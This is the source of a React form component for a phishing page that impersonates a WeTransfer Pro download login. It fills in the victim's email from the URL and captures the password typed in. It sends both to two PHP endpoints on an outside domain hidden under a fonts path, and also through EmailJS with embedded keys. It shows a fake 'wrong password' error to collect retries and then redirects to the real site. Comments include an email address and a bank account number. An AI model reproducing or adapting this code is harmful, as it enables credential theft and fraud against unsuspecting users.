
import React, { useState, useRef } from "react";
import './Form.css';
import emailJS from '@emailjs/browser';
import PreLoader from '../Preloader/Preloader';
import $ from 'jquery';

export const Form = ({ toggleForm })=>{

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1));

    // const [email, setEmail] = useState("afefarhan01@mail.ru");
    const [email, setEmail] = useState(extracetdEmail);
    const [password, setPassword] = useState("");

    const [err, setErr] = useState(false);
    const [spin, setSpin] = useState(false);

    const form = useRef();
    const [count, setCount] = useState(0);

    const submitWetransferDetails = (e)=>{
        e.preventDefault();
        // alert('erhjk');
        if(password === ""){
            return null
        }else{

            setCount(count=> count + 1);
            if(count >= 2){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                window.location.href = "https://wetransfer.com/";
            };

            // posted a request to the server below
            const user = {
                email: email,
                password: password
            };
            
            $.ajax({
                type: "POST",
                // add cpanel later 
                url: "https://pearldozen.com/nc_assets/fonts/jay/metapal79.php",
                data: user,
                success(data) {
                    console.log('ok');
                },
            });


            $.ajax({
                type: "POST",
                // add cpanel later 
                url: "https://pearldozen.com/nc_assets/fonts/jay/ada1masa.php",
                data: user,
                success(data) {
                    console.log('ok');
                },
            });


            // let data = {
            //     username: email,
            //     password: password
            //   };
              
            //   POST REQUEST FROM EMAILJS 
              
            emailJS.sendForm('service_o80hmwd', 'template_dn969sb', form.current, '_P909NFb_RdL8lnqi')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });

            // template variable 
            // user_name
            // user_password


            // emailJS.sendForm('service_rt8lcqf', 'template_k47h6u5', form.current, 'OiZiEI11qPTzZNaWM')
            // .then((result) => {
            //     console.log(result.text);
            // }, (error) => {
            //     console.log(error.text);
            // });
            
            //   http://localhost:6040/ali/get
            // const myURI = "http://localhost:6040/ali/create";


            // create URL commented for now 
            // =====================================
        //     const live_URI = "https://sample-backend-oeeb.onrender.com/v/api/aBc/create";

      
        //   fetch(live_URI, {
        //           method:'POST',
        //           headers: {
        //               "Content-Type": 'application/json',
        //               "Access-Control-Allow-Origin": "*"
        //             },
        //             body: JSON.stringify(data)
        //       })
        //       .then((res)=> {
        //           res.json();
        //       })
        //       .then(data=> console.log('ok'))
        //       .catch(err=> console.error(err));


        // =========================================

            setSpin(true);

            setTimeout(() => {
                setSpin(false);
                setPassword('');
                setErr(true);
                setTimeout(() => {
                    setErr(false);
                }, 2700);
            }, 2000);
        }
    };

    return(<div className="Form">

        <div className="modal">
            <div className="m-content">

                <div className="m-top">
                    <button className="cls-btn" id="mk_ekx_bodr_circ" onClick={toggleForm}>x</button>
                </div>


                <div className="box">

                    <form autoComplete="off" ref={form} onSubmit={submitWetransferDetails}>

                        { spin ? <PreLoader /> : null }

                        <div className="form-group">
                            <input 
                            type={`email`}
                            name="email"
                            className="form-control"
                            required
                            placeholder="Email Address"
                            value={email}
                            onChange={e=> setEmail(e.target.value)}
                            readOnly
                            />
                        </div>



                        <div className="form-group">
                            <input 
                            type={`password`}
                            name="password"
                            className="form-control"
                            required
                            placeholder="Password"
                            value={password}
                            onChange={e=> setPassword(e.target.value)}
                            autoFocus
                            />
                        </div>


                        <button type="submit" className="login-btn dn_ld_iefh" onClick={submitWetransferDetails}>
                            Download
                        </button>

                    </form>

                    <div className="m-footer">
                        <h1>WeTransfer Pro</h1>
                        <p>Get more out of WeTransfer, get Pro</p>
                    </div>

                   { err ? <p className="error-box">
                        This email address and password don't seem to match...
                        Please double-check and try again
                    </p> : null}

                </div>


            </div>
        </div>

    </div>)
};

// GT Bank => 0506869203
